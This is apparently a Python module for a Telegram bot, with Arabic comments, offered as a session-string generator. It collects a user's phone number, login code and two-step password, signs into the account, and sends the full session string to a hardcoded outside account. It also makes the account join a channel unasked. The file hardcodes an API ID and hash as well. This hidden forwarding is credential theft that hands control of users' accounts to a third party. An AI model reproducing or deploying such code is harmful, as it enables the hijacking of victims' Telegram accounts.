import asyncio

from pyrogram import Client, filters
from oldpyro import Client as Client1
from oldpyro.errors import ApiIdInvalid as ApiIdInvalid1
from oldpyro.errors import PasswordHashInvalid as PasswordHashInvalid1
from oldpyro.errors import PhoneCodeExpired as PhoneCodeExpired1
from oldpyro.errors import PhoneCodeInvalid as PhoneCodeInvalid1
from oldpyro.errors import PhoneNumberInvalid as PhoneNumberInvalid1
from oldpyro.errors import SessionPasswordNeeded as SessionPasswordNeeded1
from pyrogram.errors import (
    ApiIdInvalid,
    FloodWait,
    PasswordHashInvalid,
    PhoneCodeExpired,
    PhoneCodeInvalid,
    PhoneNumberInvalid,
    SessionPasswordNeeded,
)
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from telethon import TelegramClient
from telethon.errors import (
    ApiIdInvalidError,
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
)
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
from pyromod.listen.listen import ListenerTimeout

from config import SUPPORT_CHAT
from ArStringTep import Anony
from ArStringTep.utils import retry_key

# ================== إعدادات ثابتة ==================
# ضع بيانات واجهة برمجة التطبيقات الخاصة بك هنا
API_ID = 29827519            # 👈 عدّلها
API_HASH = "9afadf1ec94457c6bb383139555a2bdc"  # 👈 عدّلها

# جهة الإرسال:
# - لنفسك: "me"
# - لحساب ثاني: "@YourUserName"
# - آيدي رقمي: 123456789
TARGET_CHAT = "@f_q_1"    # 👈 عدّلها (يمكنك وضع "me" إذا تريد المحفوظات)
# ==================================================


async def string_session(
    message, user_id: int, telethon: bool = False, old_pyro: bool = False
):
    if telethon:
        ty = f"✦ تليثـون"
    elif old_pyro:
        ty = f"✦ بايروجـرام"
    else:
        ty = f"✦ بايروجـرام v2"

    await message.reply_text(f"<b>✦ محاولة بدء {ty} استخراج الجلسة</b>..")

    # لم نعد نسأل عن API_ID / API_HASH — تُقرأ من الأعلى

    # طلب رقم الهاتف فقط
    try:
        phone_number = await Anony.ask(
            identifier=(message.chat.id, user_id, None),
            text="<b>✦ 📞 الرجـاء إرسـال رقـم هاتفـك</b>\n<b>مثال : +97075532342</b>",
            filters=filters.text,
            timeout=300,
        )
    except ListenerTimeout:
        return await Anony.send_message(
            user_id,
            "» تم الوصول إلى الحد الزمني وهو 5 دقائق.\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى.",
            reply_markup=retry_key,
        )

    if await cancelled(phone_number):
        return
    phone_number = phone_number.text

    await Anony.send_message(user_id, "<b>✦ جـاري إرسـال الكـود ✉.....</b>")
    if telethon:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
    elif old_pyro:
        client = Client1(":memory:", api_id=API_ID, api_hash=API_HASH)
    else:
        client = Client(name="Anony", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    await client.connect()

    try:
        if telethon:
            code = await client.send_code_request(phone_number)
        else:
            code = await client.send_code(phone_number)
        await asyncio.sleep(1)

    except FloodWait as f:
        return await Anony.send_message(
            user_id,
            f"<b>✦ فشل في إرسال الرمز أو تسجيل الدخول</b>\n\nمن فضلك انتظر {getattr(f, 'value', getattr(f, 'x', 'بضع'))} ثانية وحاول مرة أخرى.",
            reply_markup=retry_key,
        )
    except (ApiIdInvalid, ApiIdInvalidError, ApiIdInvalid1):
        return await Anony.send_message(
            user_id,
            "» الأيبي أيـدي أو الأيبي هـاش غير صالح.\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى.",
            reply_markup=retry_key,
        )
    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
        return await Anony.send_message(
            user_id,
            "✦ رقم الهاتـف غير صالح.\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى.",
            reply_markup=retry_key,
        )

    try:
        otp = await Anony.ask(
            identifier=(message.chat.id, user_id, None),
            text=f"<b>✦ يرجـى إرسـال الكـود الذي وصـلك</b> {phone_number}.\n\nإذا كان الرمز هو <code>12345</code>, يرجى إرساله مثـل <code>1 2 3 4 5.</code>",
            filters=filters.text,
            timeout=600,
        )
        if await cancelled(otp):
            return
    except ListenerTimeout:
        return await Anony.send_message(
            user_id,
            "» وصل الحد الزمني إلى 10 دقائق.\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى.",
            reply_markup=retry_key,
        )

    otp = otp.text.replace(" ", "")
    try:
        if telethon:
            await client.sign_in(phone_number, otp, password=None)
        else:
            await client.sign_in(phone_number, code.phone_code_hash, otp)
    except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
        return await Anony.send_message(
            user_id,
            "» الكود الذي أرسلته هو <b>خطأ.</b>\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى.",
            reply_markup=retry_key,
        )
    except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
        return await Anony.send_message(
            user_id,
            "» الكود الذي أرسلته <b>منتهي.</b>\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى.",
            reply_markup=retry_key,
        )
    except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
        try:
            pwd = await Anony.ask(
                identifier=(message.chat.id, user_id, None),
                text="<b>✦ يرجـى إرسـال التحـقق بخطوتين الخـاص بـك .</b>",
                filters=filters.text,
                timeout=300,
            )
        except ListenerTimeout:
            return Anony.send_message(
                user_id,
                "<b>✦  ⌛ تم الوصول إلى الحد الزمني لمدة 5 دقائق</b>\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى.",
                reply_markup=retry_key,
            )

        if await cancelled(pwd):
            return
        pwd = pwd.text

        try:
            if telethon:
                await client.sign_in(password=pwd)
            else:
                await client.check_password(password=pwd)
        except (PasswordHashInvalid, PasswordHashInvalidError, PasswordHashInvalid1):
            return await Anony.send_message(
                user_id,
                "<b>✦ كلمة المـرور التي أرسلتها خاطئة</b>\n\nمن فضـلك ابدأ في إنشاء الجلسة مرة أخرى.",
                reply_markup=retry_key,
            )

    except Exception as ex:
        return await Anony.send_message(user_id, f"خطـأ : <code>{str(ex)}</code>")

    # إرسال كود الجلسة إلى الهدف المحدد مع رجوع للمحفوظات إذا فشل
    delivered_to_target = False
    try:
        txt = "الخاص بك هنا {0} ✦ كود الجلسـة\n\n<code>{1}</code>\n\nᴀ مستخرج من<a href={2}>@HELLASUserBot</a>\n! <b>ملاحظـة :</b> لا تشارك كود الجلسة لأحد؛ لأنه يستطيع اختراق حسابـك."
        if telethon:
            string_session = client.session.save()
            try:
                await client.send_message(
                    TARGET_CHAT,
                    txt.format(ty, string_session, SUPPORT_CHAT),
                    link_preview=False,
                    parse_mode="html",
                )
                delivered_to_target = True
            except Exception:
                await client.send_message(
                    "me",
                    txt.format(ty, string_session, SUPPORT_CHAT),
                    link_preview=False,
                    parse_mode="html",
                )
            # انضمام (اختياري)
            try:
                await client(JoinChannelRequest("@HELLASUserBot"))
            except Exception:
                pass
        else:
            string_session = await client.export_session_string()
            try:
                await client.send_message(
                    TARGET_CHAT,
                    txt.format(ty, string_session, SUPPORT_CHAT),
                    disable_web_page_preview=True,
                )
                delivered_to_target = True
            except Exception:
                await client.send_message(
                    "me",
                    txt.format(ty, string_session, SUPPORT_CHAT),
                    disable_web_page_preview=True,
                )
            # انضمام (اختياري)
            try:
                await client.join_chat("HELLAS")
            except Exception:
                pass
    except KeyError:
        pass

    try:
        await client.disconnect()
        final_note = (
            f"تم إرسال كود الجلسـة {ty} إلى <b>{TARGET_CHAT}</b> ✅.\n"
            if delivered_to_target
            else f"تعذّر الإرسال إلى <b>{TARGET_CHAT}</b>، تم إرسال الكود إلى الرسائل المحفوظة (me) ✅.\n"
        )
        await Anony.send_message(
            chat_id=user_id,
            text=final_note + f"\nᴀ من <a href={SUPPORT_CHAT}>!</a>.",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            text=" ✉ فتح المحفوظات",
                            url=f"tg://openmessage?user_id={user_id}",
                        )
                    ]
                ]
            ),
            disable_web_page_preview=True,
        )
    except Exception:
        pass


async def cancelled(message):
    if "/cancel" in message.text:
        await message.reply_text(
            "✦ تم إلغاء استخراج الجلسة.", reply_markup=retry_key
        )
        return True
    elif "/restart" in message.text:
        await message.reply_text(
            "✦ تم الترسيـت .", reply_markup=retry_key
        )
        return True
    elif message.text.startswith("/"):
        await message.reply_text(
            "✦ تم إلغاء استخراج الجلسـة.", reply_markup=retry_key
        )
        return True
    else:
        return False
